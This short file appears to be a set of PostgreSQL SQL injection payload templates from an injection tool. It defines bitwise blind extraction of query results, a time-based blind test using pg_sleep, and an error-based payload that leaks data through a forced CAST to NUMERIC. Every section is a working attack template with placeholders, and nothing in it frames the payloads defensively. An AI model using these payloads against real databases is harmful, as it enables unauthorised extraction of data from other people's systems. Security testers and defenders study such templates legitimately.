test.bit:
/**
 * true bit return bit, false bit return 0
 * 8 & 8 = 8, 8 & 4 = 0
 */
0 != (
    ascii(
        substr(
            (${INJECTION}), 
            ${INDEX}, 
            1
        )
    ) 
    %26 ${BIT}
)

boolean.time:
and ''='' 
|| (
    select 
        CASE WHEN ${TEST} 
        THEN '' 
        else pg_sleep(${SLEEP_TIME}) 
    END
)

method.query:
/* Require FALSE statement, then OR */
and 1 = 0 
or 1 = CAST(
    (${WINDOW})::text 
    AS NUMERIC
)
